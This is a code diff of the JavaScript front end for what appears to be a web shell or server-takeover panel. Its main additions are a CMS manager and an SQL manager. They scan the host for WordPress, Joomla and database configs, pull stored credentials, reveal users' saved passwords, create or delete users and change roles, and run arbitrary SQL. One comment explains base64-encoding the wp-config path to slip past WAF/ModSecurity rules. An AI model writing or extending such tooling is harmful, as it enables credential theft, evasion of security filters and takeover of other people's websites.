+document.getElementById('sshEditSudoBtn')?.addEventListener('click',function(){
+  sshActPost(this.dataset.action);
+});
+document.getElementById('sshEditLockBtn')?.addEventListener('click',function(){
+  sshActPost(this.dataset.action);
+});
+
+/* ═══════════════════════════════════════
+   CMS MANAGER (WordPress / Joomla) - admin
+═══════════════════════════════════════ */
+/* ═══════════════════════════════════════
+   CMS MANAGER - auto-scan + full user CRUD
+═══════════════════════════════════════ */
+let cmsCurrentCfg=null,cmsCurrentType=null,cmsEditUserId=null,cmsAllRoles=[];
+/* Encode the config path as base64 and POST it — never place "wp-config.php"
+   literally in a URL or query string, since many hosts' WAF/ModSecurity rules
+   block requests that look like an attempt to read that file. */
+function cmsB64(s){return btoa(unescape(encodeURIComponent(s)));}
+async function cmsPost(op,extra){
+  const fd=new FormData();
+  fd.append('cfg_b64',cmsB64(cmsCurrentCfg||''));
+  if(extra)for(const k in extra)fd.append(k,extra[k]);
+  const r=await fetch('?x='+op,{method:'POST',body:fd});
+  return r.json();
+}
+
+document.getElementById('cmsBtn')?.addEventListener('click',()=>{openMod('cmsOv');cmsShowPicker();});
+document.getElementById('cmsClose')?.addEventListener('click',()=>closeMod('cmsOv'));
+
+/* ── Installation picker ──────────────────────────────────────────────────── */
+async function cmsShowPicker(){
+  const el=document.getElementById('cmsBody');
+  el.innerHTML=`<div style="text-align:center;padding:32px;color:var(--t3)">
+    <svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin-bottom:10px;display:block;margin-inline:auto"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    Scanning server for WordPress &amp; Joomla installations…</div>`;
+  try{
+    const scanRes=await fetch('?x=cmsscan').then(r=>r.json());
+    if(scanRes.error){el.innerHTML='<div class="empty" style="padding:32px"><p>'+esc(scanRes.error)+'</p></div>';return;}
+    const sites=scanRes.sites||[];
+    const obdHint=(scanRes.open_basedir&&scanRes.open_basedir.length)
+      ?`<div style="padding:10px 16px;background:rgba(244,163,51,.1);border-bottom:1px solid var(--b2);font-size:11px;color:#f4a333;line-height:1.5">This server restricts PHP to certain folders (open_basedir), so the scan could only look inside: <span style="font-family:monospace">${esc(scanRes.open_basedir.join(', '))}</span>. If your CMS lives outside that, use the manual path field below.</div>`
+      :'';
+
+    const typeIcon=t=>t==='wordpress'
+      ?`<span style="background:rgba(33,117,155,.2);color:#5bc0de;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700">WordPress</span>`
+      :`<span style="background:rgba(244,163,51,.15);color:#f4a333;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700">Joomla</span>`;
+
+    const cards=sites.map(s=>`
+      <div class="cms-site-card" data-cfg="${esc(s.config)}" data-type="${esc(s.type)}"
+           style="display:flex;align-items:center;gap:14px;padding:13px 16px;border-bottom:1px solid var(--b2);cursor:pointer;transition:background .15s"
+           onmouseover="this.style.background='rgba(255,255,255,.04)'" onmouseout="this.style.background=''">
+        <div style="flex:1;min-width:0">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:3px">
+            ${typeIcon(s.type)}
+            <span style="font-size:12px;font-weight:600;color:var(--t1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.dir)}</span>
+          </div>
+          <div style="font-size:10.5px;color:var(--t3);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.config)}</div>
+        </div>
+        <svg viewBox="0 0 24 24" style="width:16px;height:16px;stroke:var(--t3);fill:none;stroke-width:2;flex-shrink:0"><polyline points="9 18 15 12 9 6"/></svg>
+      </div>`).join('');
+
+    el.innerHTML=`
+      <div style="padding:12px 16px;border-bottom:1px solid var(--b2);display:flex;align-items:center;gap:10px">
+        <span style="font-size:12px;color:var(--t2);flex:1">${sites.length} installation${sites.length!==1?'s':''} found</span>
+      </div>
+      ${obdHint}
+      ${sites.length?`<div style="overflow:auto;max-height:42vh">${cards}</div>`
+        :'<div class="empty" style="padding:32px"><p>No WordPress or Joomla installations found automatically. Enter the full path below instead.</p></div>'}
+      <div style="padding:14px 16px;border-top:1px solid var(--b2)">
+        <div style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:7px">Manual path to config file</div>
+        <div style="display:flex;gap:8px">
+          <input type="text" id="cmsManualPath" class="inp" style="flex:1;font-size:12px;font-family:monospace"
+            placeholder="/var/www/html/wp-config.php  or  configuration.php">
+          <button class="btn btn-p" id="cmsManualBtn" style="white-space:nowrap;font-size:12px">Open</button>
+        </div>
+      </div>`;
+
+    // Click a discovered site
+    el.querySelectorAll('.cms-site-card').forEach(c=>c.addEventListener('click',()=>{
+      cmsCurrentCfg=c.dataset.cfg;cmsCurrentType=c.dataset.type;loadCmsUsers();
+    }));
+    // Manual path
+    document.getElementById('cmsManualBtn').addEventListener('click',()=>{
+      const p=document.getElementById('cmsManualPath').value.trim();
+      if(!p){toast('Enter the full path to wp-config.php or configuration.php');return;}
+      const base=p.split('/').pop();
+      if(base==='wp-config.php')cmsCurrentType='wordpress';
+      else if(base==='configuration.php')cmsCurrentType='joomla';
+      else{toast('File must be wp-config.php (WordPress) or configuration.php (Joomla)');return;}
+      cmsCurrentCfg=p;loadCmsUsers();
+    });
+    document.getElementById('cmsManualPath').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('cmsManualBtn').click();});
+  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Scan failed: '+esc(String(e))+'</div>';}
+}
+
+/* ── Users list ───────────────────────────────────────────────────────────── */
+async function loadCmsUsers(){
+  const el=document.getElementById('cmsBody');
+  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading users…</div>';
+  try{
+    const d=await cmsPost('cmsusers');
+    if(d.error){
+      el.innerHTML=`<div style="padding:14px 16px;border-bottom:1px solid var(--b2)">
+        <button class="btn btn-s" id="cmsBackBtn2" style="font-size:11px">← Back</button></div>
+        <div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;
+      document.getElementById('cmsBackBtn2')?.addEventListener('click',cmsShowPicker);return;
+    }
+    // Pre-fetch roles for the edit form
+    const rd=await cmsPost('cmsroles').catch(()=>({roles:[]}));
+    cmsAllRoles=rd.roles||[];
+
+    const typeLabel=d.type==='wordpress'?'WordPress':'Joomla';
+    const rows=d.users.map(u=>{
+      const roleTxt=u.role?String(u.role):'-';
+      const blockedBadge=(u.blocked===true)?`<span style="color:#fb923c;font-size:10px;font-weight:700;display:inline-flex;align-items:center;margin-left:4px"><svg viewBox="0 0 24 24" style="width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2.2;stroke-linecap:round"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg></span>`:'';
+      return `<tr>
+        <td class="mono" style="font-size:11.5px;padding:9px 10px">${u.id}</td>
+        <td style="padding:9px 10px;font-weight:600">${esc(u.name)}${blockedBadge}</td>
+        <td style="padding:9px 10px;font-size:11.5px;color:var(--t2)">${esc(u.email||'')}</td>
+        <td style="padding:9px 10px"><span style="background:var(--raised);padding:2px 9px;border-radius:20px;font-size:11px">${esc(roleTxt)}</span></td>
+        <td style="padding:9px 10px">
+          <span class="cms-pw-cell" data-id="${u.id}" data-name="${esc(u.name)}" data-state="hidden"
+            style="cursor:pointer;font-family:monospace;font-size:12px;color:var(--t2);display:inline-flex;align-items:center;gap:6px;user-select:none"
+            title="Click to reveal the saved password">
+            <span class="cms-pw-txt">••••••••</span>
+            <svg viewBox="0 0 24 24" style="width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+          </span>
+        </td>
+        <td style="padding:9px 10px;text-align:right;white-space:nowrap">
+          <button class="btn btn-xs cms-edit-btn" data-id="${u.id}" data-name="${esc(u.name)}" data-role="${esc(roleTxt)}"
+            style="margin-right:4px;font-size:11px">Edit / Change Password</button>
+          <button class="btn btn-xs btn-red cms-del-btn" data-id="${u.id}" data-name="${esc(u.name)}"
+            style="font-size:11px">Delete</button>
+        </td></tr>`;
+    }).join('');
+
+    el.innerHTML=`
+      <div style="display:flex;align-items:center;gap:10px;padding:11px 16px;border-bottom:1px solid var(--b2);flex-wrap:wrap">
+        <button class="btn btn-s" id="cmsBackBtn" style="font-size:11px">← Back</button>
+        <div style="flex:1;font-size:12px;color:var(--t2)">
+          <strong style="color:var(--t1)">${typeLabel}</strong>
+          <span style="color:var(--t3);font-family:monospace;font-size:10.5px;margin-left:6px">${esc(cmsCurrentCfg)}</span>
+        </div>
+        <button class="btn btn-p" id="cmsAddBtn" style="font-size:12px;padding:6px 14px">+ Add User</button>
+      </div>
+      <div style="overflow:auto;max-height:50vh">
+        <table class="log-t" style="width:100%">
+          <thead><tr>
+            <th style="padding:8px 10px">ID</th><th style="padding:8px 10px">Username</th>
+            <th style="padding:8px 10px">Email</th><th style="padding:8px 10px">Role</th>
+            <th style="padding:8px 10px">Password</th>
+            <th style="padding:8px 10px;text-align:right">Actions</th>
+          </tr></thead>
+          <tbody>${rows||`<tr><td colspan="6" style="padding:24px;text-align:center;color:var(--t3)">No users found.</td></tr>`}</tbody>
+        </table>
+      </div>`;
+
+    document.getElementById('cmsBackBtn')?.addEventListener('click',cmsShowPicker);
+    document.getElementById('cmsAddBtn')?.addEventListener('click',()=>openCmsAdd());
+
+    // Edit (change role / password)
+    el.querySelectorAll('.cms-edit-btn').forEach(b=>b.addEventListener('click',()=>{
+      cmsEditUserId=b.dataset.id;
+      document.getElementById('cmsEditTitle').textContent='Edit: '+b.dataset.name;
+      document.getElementById('cmsEditPass').value='';
+      // populate role select
+      const sel=document.getElementById('cmsEditRole');
+      sel.innerHTML='';
+      if(d.type==='wordpress'){
+        cmsAllRoles.forEach(r=>{const o=document.createElement('option');o.value=r;o.textContent=r;if(r===b.dataset.role)o.selected=true;sel.appendChild(o);});
+      } else {
+        cmsAllRoles.forEach(r=>{const o=document.createElement('option');o.value=r.id;o.textContent=r.title;if(String(r.id)===b.dataset.role||r.title===b.dataset.role)o.selected=true;sel.appendChild(o);});
+      }
+      openMod('cmsEditOv');
+    }));
+
+    // Reveal saved password (click to fetch/decrypt, click again to hide)
+    el.querySelectorAll('.cms-pw-cell').forEach(c=>c.addEventListener('click',async()=>{
+      const txt=c.querySelector('.cms-pw-txt');
+      if(c.dataset.state==='shown'){txt.textContent='••••••••';c.dataset.state='hidden';c.title='Click to reveal the saved password';return;}
+      txt.textContent='…';
+      const d=await cmsPost('cms_get_pass',{cms_id:c.dataset.id}).catch(()=>({error:'Request failed.'}));
+      if(d.error){toast(d.error);txt.textContent='••••••••';return;}
+      txt.textContent=d.pass;c.dataset.state='shown';c.title='Click to hide';
+    }));
+
+    // Delete
+    el.querySelectorAll('.cms-del-btn').forEach(b=>b.addEventListener('click',async()=>{
+      if(!confirm(`Delete CMS user "${b.dataset.name}"? This cannot be undone.`))return;
+      const fd=new FormData();
+      fd.append('csrf_token',CSRF);fd.append('action','cms_delete_user');
+      fd.append('config_path_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',b.dataset.id);
+      await fetch('',{method:'POST',body:fd});
+      toast('User deleted.');loadCmsUsers();
+    }));
+
+  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed: '+esc(String(e))+'</div>';}
+}
+
+/* ── Add user modal ───────────────────────────────────────────────────────── */
+async function openCmsAdd(){
+  document.getElementById('cmsAddCfg').value=cmsCurrentCfg;
+  document.getElementById('cmsAddUser').value='';document.getElementById('cmsAddEmail').value='';document.getElementById('cmsAddPass').value='';
+  const sel=document.getElementById('cmsAddRole');sel.innerHTML='<option>Loading…</option>';
+  openMod('cmsAddOv');
+  try{
+    if(cmsCurrentType==='wordpress'){sel.innerHTML=cmsAllRoles.map(r=>`<option value="${r}">${r}</option>`).join('');}
+    else{sel.innerHTML=cmsAllRoles.map(r=>`<option value="${r.id}">${esc(r.title)}</option>`).join('');}
+  }catch{sel.innerHTML='<option value="">(default)</option>';}
+}
+document.getElementById('cmsAddClose')?.addEventListener('click',()=>closeMod('cmsAddOv'));
+document.getElementById('cmsAddApply')?.addEventListener('click',async()=>{
+  const uname=document.getElementById('cmsAddUser').value.trim();
+  const email=document.getElementById('cmsAddEmail').value.trim();
+  const pass=document.getElementById('cmsAddPass').value;
+  const role=document.getElementById('cmsAddRole').value;
+  if(!uname||!email||pass.length<6){toast('Fill username, email, and a password of at least 6 characters.');return;}
+  const fd=new FormData();
+  fd.append('csrf_token',CSRF);fd.append('action','cms_create_user');fd.append('config_path_b64',cmsB64(cmsCurrentCfg));
+  fd.append('cms_user',uname);fd.append('cms_email',email);fd.append('cms_pass',pass);fd.append('cms_role',role);
+  const btn=document.getElementById('cmsAddApply');btn.textContent='Creating…';btn.disabled=true;
+  await fetch('',{method:'POST',body:fd});
+  btn.textContent='Create User';btn.disabled=false;
+  closeMod('cmsAddOv');loadCmsUsers();
+});
+
+/* ── Edit user modal (change role / password) ────────────────────────────── */
+document.getElementById('cmsEditClose')?.addEventListener('click',()=>closeMod('cmsEditOv'));
+document.getElementById('cmsEditApply')?.addEventListener('click',async()=>{
+  const role=document.getElementById('cmsEditRole').value;
+  const pass=document.getElementById('cmsEditPass').value;
+  if(role){
+    const fd=new FormData();
+    fd.append('csrf_token',CSRF);fd.append('action','cms_update_role');
+    fd.append('config_path_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',cmsEditUserId);fd.append('cms_role',role);
+    await fetch('',{method:'POST',body:fd});
+  }
+  if(pass){
+    if(pass.length<6){toast('Password must be at least 6 characters.');return;}
+    const fd=new FormData();
+    fd.append('csrf_token',CSRF);fd.append('action','cms_change_pass');
+    fd.append('config_path_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',cmsEditUserId);fd.append('cms_pass',pass);
+    await fetch('',{method:'POST',body:fd});
+  }
+  closeMod('cmsEditOv');loadCmsUsers();
+});
+
+/* ═══════════════════════════════════════
    NETWORK SPEED TEST (ping / download / upload)
 ═══════════════════════════════════════ */
 document.getElementById('speedBtn')?.addEventListener('click',()=>openMod('speedOv'));
 document.getElementById('speedClose')?.addEventListener('click',()=>closeMod('speedOv'));
 document.getElementById('spRun')?.addEventListener('click',async()=>{
   const btn=document.getElementById('spRun'),st=document.getElementById('spStatus');
-  btn.disabled=true;document.getElementById('spPing').textContent='—';document.getElementById('spDown').textContent='—';document.getElementById('spUp').textContent='—';
+  btn.disabled=true;document.getElementById('spPing').textContent='-';document.getElementById('spDown').textContent='-';document.getElementById('spUp').textContent='-';
+  st.textContent='Testing the server\'s connection to the internet… this runs entirely on the server.';
   try{
-    st.textContent='Measuring ping…';
-    let pings=[];
-    for(let i=0;i<3;i++){const t0=performance.now();await fetch('?x=speedping&r='+Math.random(),{cache:'no-store'});pings.push(performance.now()-t0);}
-    const ping=Math.round(Math.min(...pings));
-    document.getElementById('spPing').textContent=ping+' ms';
-
-    st.textContent='Measuring download…';
-    const mb=5,dt0=performance.now();
-    const r=await fetch('?x=speeddown&mb='+mb+'&r='+Math.random(),{cache:'no-store'});
-    await r.arrayBuffer();
-    const dSec=(performance.now()-dt0)/1000;
-    const downMbps=(mb*8/dSec).toFixed(1);
-    document.getElementById('spDown').textContent=downMbps+' Mbps';
-
-    st.textContent='Measuring upload…';
-    const upMb=3,payload=new Blob([new Uint8Array(upMb*1024*1024)]);
-    const ut0=performance.now();
-    await fetch('?x=speedup',{method:'POST',body:payload});
-    const uSec=(performance.now()-ut0)/1000;
-    const upMbps=(upMb*8/uSec).toFixed(1);
-    document.getElementById('spUp').textContent=upMbps+' Mbps';
-    st.textContent='Done.';
-  }catch{st.textContent='Test failed.';}
+    const d=await fetch('?x=speedtest_server&r='+Math.random(),{cache:'no-store'}).then(r=>r.json());
+    document.getElementById('spPing').textContent=(d.ping_ms!=null?d.ping_ms+' ms':'-');
+    document.getElementById('spDown').textContent=(d.download_mbps!=null?d.download_mbps+' Mbps':'-');
+    document.getElementById('spUp').textContent=(d.upload_mbps!=null?d.upload_mbps+' Mbps':'-');
+    st.textContent=d.error?d.error:'Done — measured on the server, not your device.';
+  }catch{st.textContent='Test failed. The server could not be reached or the request errored.';}
   btn.disabled=false;
 });
 
@@ -2326,7 +4087,7 @@ function permToOctal(){
 permChecks.forEach(cb=>cb.addEventListener('change',()=>{permOctal.value=permToOctal();}));
 permOctal?.addEventListener('input',()=>{if(/^[0-7]{3,4}$/.test(permOctal.value))permFromOctal(permOctal.value);});
 function openPerm(name,perm){
-  document.getElementById('permTitle').textContent='Permissions — '+name;
+  document.getElementById('permTitle').textContent='Permissions - '+name;
   document.getElementById('permName').value=name;
   const oct=(perm||'0644').slice(-3);
   permOctal.value=oct;permFromOctal(oct);
@@ -2338,7 +4099,7 @@ document.getElementById('permClose')?.addEventListener('click',()=>closeMod('per
    SHARE LINKS
 ═══════════════════════════════════════ */
 function openShareCreate(name){
-  document.getElementById('shareCreateTitle').textContent='Share Link — '+name;
+  document.getElementById('shareCreateTitle').textContent='Share Link - '+name;
   document.getElementById('shareItemName').value=name;
   openMod('shareCreateOv');
 }
@@ -2363,7 +4124,7 @@ async function calcDirSize(name,trigger){
       const span=document.createElement('span');span.className='sz';span.textContent=txt;
       b.replaceWith(span);
     });
-    toast(`"${name}": ${formatBytes(d.size)}${d.capped?' (partial, still large)':''} — ${d.files} files, ${d.dirs} folders`,4000);
+    toast(`"${name}": ${formatBytes(d.size)}${d.capped?' (partial, still large)':''} - ${d.files} files, ${d.dirs} folders`,4000);
   }catch{toast('Could not calculate size.');btns.forEach(b=>{b.disabled=false;const lbl=b.querySelector('.bl');if(lbl)lbl.textContent='Size';});}
 }
 document.querySelectorAll('.dsz-btn').forEach(b=>b.addEventListener('click',e=>{e.stopPropagation();calcDirSize(b.dataset.n,b);}));
@@ -2466,7 +4227,7 @@ function uploadWithProgress(files){
   const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','upload');
   for(const f of files)fd.append('file[]',f);
   const bar=document.createElement('div');
-  bar.style.cssText='position:fixed;left:50%;bottom:calc(var(--bh,26px) + 12px);transform:translateX(-50%);background:#18181c;border:1px solid rgba(255,255,255,.12);color:#f4f4f5;padding:10px 18px;border-radius:10px;font-size:12.5px;font-weight:500;z-index:9999;min-width:240px;box-shadow:0 8px 32px rgba(0,0,0,.5)';
+  bar.style.cssText='position:fixed;left:50%;bottom:calc(var(--bh,26px) + 12px);transform:translateX(-50%);background:var(--raised);border:1px solid var(--border2);color:var(--t1);padding:10px 18px;border-radius:10px;font-size:12.5px;font-weight:500;z-index:9999;min-width:240px;box-shadow:0 8px 32px rgba(0,0,0,.5)';
   bar.innerHTML='<div style="display:flex;justify-content:space-between;margin-bottom:6px"><span>Uploading…</span><span id="upSpeedTxt">0 MB/s</span></div><div style="height:4px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden"><div id="upSpeedBar" style="height:100%;width:0%;background:#818cf8;transition:width .1s"></div></div>';
   document.body.appendChild(bar);
   const xhr=new XMLHttpRequest();
@@ -2517,9 +4278,186 @@ const rs=document.createElement('style');rs.textContent='@keyframes rip{to{trans
 ═══════════════════════════════════════ */
 function toast(msg,dur=2000){
   const el=document.createElement('div');
-  el.style.cssText='position:fixed;bottom:calc(var(--bh,26px) + 12px);left:50%;transform:translate(-50%,0);background:#18181c;border:1px solid rgba(255,255,255,.12);color:#f4f4f5;padding:8px 16px;border-radius:10px;font-size:13px;font-weight:500;z-index:9999;white-space:nowrap;box-shadow:0 8px 32px rgba(0,0,0,.5);animation:fadeUp .25s cubic-bezier(.34,1.56,.64,1) both';
+  el.style.cssText='position:fixed;bottom:calc(var(--bh,26px) + 12px);left:50%;transform:translate(-50%,0);background:var(--raised);border:1px solid var(--border2);color:var(--t1);padding:8px 16px;border-radius:10px;font-size:13px;font-weight:500;z-index:9999;white-space:nowrap;box-shadow:0 8px 32px rgba(0,0,0,.5);animation:fadeUp .25s cubic-bezier(.34,1.56,.64,1) both';
   el.textContent=msg;document.body.appendChild(el);
   setTimeout(()=>{el.style.opacity='0';el.style.transform='translate(-50%,8px)';el.style.transition='.2s';setTimeout(()=>el.remove(),220);},dur);
+}
+
+
+/* ═══════════════════════════════════════
+   SQL DATABASE MANAGER
+═══════════════════════════════════════ */
+let sqlCreds={host:'localhost',port:3306,user:'',pass:'',db:''};
+let sqlCurrentTable='';let sqlCurrentPage=1;
+function sqlPost(op,extra){
+  const fd=new FormData();fd.append('csrf_token',CSRF);
+  fd.append('sql_host',sqlCreds.host);fd.append('sql_port',sqlCreds.port);
+  fd.append('sql_user',sqlCreds.user);fd.append('sql_pass',sqlCreds.pass);
+  fd.append('sql_db',sqlCreds.db);
+  if(extra)for(const k in extra)fd.append(k,extra[k]);
+  return fetch('?x='+op,{method:'POST',body:fd}).then(r=>r.json());
+}
+function sqlOpenQuery(){
+  document.getElementById('sqlQTitle').textContent='SQL Query — '+sqlCreds.db;
+  document.getElementById('sqlQDbLabel').textContent=sqlCreds.db+' @ '+sqlCreds.host;
+  openMod('sqlQueryOv');
+}
+document.getElementById('sqlBtn')?.addEventListener('click',()=>{openMod('sqlOv');sqlShowPicker();});
+document.getElementById('sqlClose')?.addEventListener('click',()=>closeMod('sqlOv'));
+document.getElementById('sqlQClose')?.addEventListener('click',()=>closeMod('sqlQueryOv'));
+async function sqlShowPicker(){
+  const el=document.getElementById('sqlBody');
+  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)"><svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin:0 auto 10px;display:block"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>Scanning for database configs…</div>';
+  try{
+    const r=await fetch('?x=sqlscan').then(r=>r.json());
+    if(r.error){el.innerHTML='<div class="empty" style="padding:32px"><p>'+esc(r.error)+'</p></div>';return;}
+    const dbs=r.databases||[];
+    const obdHint=r.open_basedir?.length?`<div style="padding:8px 16px;background:rgba(245,158,11,.1);border-bottom:1px solid var(--border);font-size:11px;color:#f4a333">Restricted to: <span style="font-family:monospace">${esc(r.open_basedir.join(', '))}</span></div>`:'';
+    const typeColors={wordpress:'#5bc0de',joomla:'#f4a333',env:'#22c55e',generic:'#818cf8'};
+    const cards=dbs.map((d,i)=>`<div class="sql-db-card" data-i="${i}" style="display:flex;align-items:center;gap:14px;padding:12px 16px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s" onmouseover="this.style.background='rgba(255,255,255,.04)'" onmouseout="this.style.background=''">
+      <svg viewBox="0 0 24 24" style="width:22px;height:22px;stroke:#818cf8;fill:none;stroke-width:1.5;flex-shrink:0"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+      <div style="flex:1;min-width:0">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:2px">
+          <span style="background:rgba(129,140,248,.15);color:${typeColors[d.type]||'#818cf8'};padding:1px 7px;border-radius:20px;font-size:10px;font-weight:700;text-transform:uppercase">${esc(d.type)}</span>
+          <span style="font-size:13px;font-weight:600;color:var(--t1)">${esc(d.db)}</span>
+          <span style="font-size:11px;color:var(--t3)">@ ${esc(d.host)}</span>
+        </div>
+        <div style="font-size:10.5px;color:var(--t3);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(d.file)}</div>
+        <div style="font-size:10.5px;color:var(--t3);margin-top:1px">user: <strong style="color:var(--t2)">${esc(d.user)}</strong>${d.pass?' · password: ****':' · no password'}</div>
+      </div>
+      <svg viewBox="0 0 24 24" style="width:14px;height:14px;stroke:var(--t3);fill:none;stroke-width:2;flex-shrink:0"><polyline points="9 18 15 12 9 6"/></svg>
+    </div>`).join('');
+    el.innerHTML=`
+      <div style="padding:10px 16px;border-bottom:1px solid var(--border);font-size:12px;color:var(--t2)">${dbs.length} database config${dbs.length!==1?'s':''} found · ${r.scanned||0} dirs scanned</div>
+      ${obdHint}
+      ${dbs.length?`<div style="overflow:auto;max-height:36vh">${cards}</div>`:'<div class="empty" style="padding:24px"><p>No configs found automatically. Use manual connection below.</p></div>'}
+      <div style="padding:14px 16px;border-top:1px solid var(--border)">
+        <div style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px">Manual Connection</div>
+        <div style="display:grid;grid-template-columns:1fr 80px;gap:8px;margin-bottom:8px">
+          <input type="text" id="sqlManHost" class="inp" value="localhost" placeholder="Host" style="font-size:12px;font-family:monospace">
+          <input type="number" id="sqlManPort" class="inp" value="3306" placeholder="Port" style="font-size:12px;font-family:monospace">
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
+          <input type="text" id="sqlManUser" class="inp" placeholder="Username" style="font-size:12px">
+          <input type="password" id="sqlManPass" class="inp" placeholder="Password" style="font-size:12px">
+        </div>
+        <div style="display:flex;gap:8px">
+          <input type="text" id="sqlManDB" class="inp" placeholder="Database name" style="flex:1;font-size:12px">
+          <button class="btn btn-p" id="sqlManBtn" style="white-space:nowrap;font-size:12px">Connect</button>
+        </div>
+      </div>`;
+    const _dbs=dbs;
+    el.querySelectorAll('.sql-db-card').forEach(c=>c.addEventListener('click',()=>{
+      const d=_dbs[+c.dataset.i];
+      sqlCreds={host:d.host,port:+(d.port)||3306,user:d.user,pass:d.pass,db:d.db};
+      sqlLoadTables();
+    }));
+    document.getElementById('sqlManBtn').addEventListener('click',()=>{
+      const h=document.getElementById('sqlManHost').value.trim()||'localhost';
+      const pt=+document.getElementById('sqlManPort').value||3306;
+      const u=document.getElementById('sqlManUser').value.trim();
+      const pw=document.getElementById('sqlManPass').value;
+      const db=document.getElementById('sqlManDB').value.trim();
+      if(!u||!db){toast('Username and database name are required.');return;}
+      sqlCreds={host:h,port:pt,user:u,pass:pw,db:db};sqlLoadTables();
+    });
+    document.getElementById('sqlManDB')?.addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('sqlManBtn').click();});
+  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Scan failed: '+esc(String(e))+'</div>';}
+}
+async function sqlLoadTables(){
+  const el=document.getElementById('sqlBody');
+  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Connecting to <strong>'+esc(sqlCreds.db)+'</strong>…</div>';
+  try{
+    const d=await sqlPost('sqltables');
+    if(d.error){el.innerHTML=`<div style="padding:11px 16px;border-bottom:1px solid var(--border)"><button class="btn btn-s" id="sqlBack1" style="font-size:11px">← Back</button></div><div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;document.getElementById('sqlBack1')?.addEventListener('click',sqlShowPicker);return;}
+    const tables=d.tables||[];
+    function sqlFmtSz(b){if(b>1048576)return(b/1048576).toFixed(1)+' MB';if(b>1024)return(b/1024).toFixed(0)+' KB';return b+' B';}
+    const rows=tables.map(t=>`<tr class="sql-tbl-row" data-name="${esc(t.name)}" style="cursor:pointer" onmouseover="this.style.background='rgba(255,255,255,.03)'" onmouseout="this.style.background=''">
+      <td style="padding:8px 12px;font-family:monospace;font-size:12px;font-weight:600;color:var(--link)">${esc(t.name)}</td>
+      <td style="padding:8px 12px;font-size:11.5px;color:var(--t2);text-align:right">${t.rows.toLocaleString()}</td>
+      <td style="padding:8px 12px;font-size:11.5px;color:var(--t3);text-align:right">${sqlFmtSz(t.size)}</td>
+      <td style="padding:8px 12px;font-size:11px;color:var(--t3)">${esc(t.engine)}</td>
+    </tr>`).join('');
+    el.innerHTML=`
+      <div style="display:flex;align-items:center;gap:10px;padding:10px 16px;border-bottom:1px solid var(--border);flex-wrap:wrap">
+        <button class="btn btn-s" id="sqlBack2" style="font-size:11px">← Back</button>
+        <span style="flex:1;font-size:12px;color:var(--t2)"><strong style="color:var(--t1)">${esc(sqlCreds.db)}</strong> <span style="color:var(--t3)">@ ${esc(sqlCreds.host)} · user: ${esc(sqlCreds.user)}</span></span>
+        <button class="btn btn-p" id="sqlQueryBtnT" style="font-size:12px;padding:6px 12px"><svg viewBox="0 0 24 24" style="width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;margin-right:4px;vertical-align:-2px"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Run SQL</button>
+      </div>
+      <div style="overflow:auto;max-height:52vh">
+        <table class="log-t" style="width:100%">
+          <thead><tr><th style="padding:8px 12px;text-align:left">Table</th><th style="padding:8px 12px;text-align:right">~Rows</th><th style="padding:8px 12px;text-align:right">Size</th><th style="padding:8px 12px">Engine</th></tr></thead>
+          <tbody>${rows||'<tr><td colspan="4" style="padding:24px;text-align:center;color:var(--t3)">No tables found.</td></tr>'}</tbody>
+        </table>
+      </div>`;
+    document.getElementById('sqlBack2')?.addEventListener('click',sqlShowPicker);
+    document.getElementById('sqlQueryBtnT')?.addEventListener('click',sqlOpenQuery);
+    el.querySelectorAll('.sql-tbl-row').forEach(r=>r.addEventListener('click',()=>{sqlCurrentTable=r.dataset.name;sqlBrowseTable(sqlCurrentTable,1);}));
+  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Error: '+esc(String(e))+'</div>';}
+}
+async function sqlBrowseTable(table,page){
+  const el=document.getElementById('sqlBody');
+  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading <strong>'+esc(table)+'</strong>…</div>';
+  try{
